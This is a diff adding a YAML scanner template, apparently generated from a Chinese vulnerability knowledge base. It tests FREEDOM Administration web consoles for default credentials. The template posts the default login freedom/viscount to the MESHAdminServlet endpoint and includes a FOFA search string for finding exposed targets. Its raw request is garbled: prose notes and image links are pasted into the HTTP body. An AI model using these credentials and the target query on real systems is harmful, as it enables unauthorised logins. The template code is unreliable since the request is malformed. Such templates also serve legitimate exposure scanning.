@@ -1,0 +1,37 @@
+id: poc-elhce5hbrwltumge
+info:
+  name: FREEDOM-Administration 默认密码漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/elhce5hbrwltumge'
+  tags: default-login,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: elhce5hbrwltumge
+    fofa: title="FREEDOM Administration"
+http:
+- raw:
+  - 'POST /mesh/servlet/mesh.webadmin.MESHAdminServlet?requestedAction=login HTTP/1.1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Host: {{Hostname}}
+
+    formLoginName=freedom&formLoginPassword=viscount
+
+    出现302即可跳转
+
+    也有可能出现200状态码，此时需要判断响应中是否存在Log  Out
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1742478114115-3b7fe11b-1a33-4893-9931-2a87be7183f3.png)
+
+    默认用户名密码：
+
+    freedom/viscount
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1742478114304-591514f1-3268-472b-8c03-235b4e7ca770.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 302
+    type: status
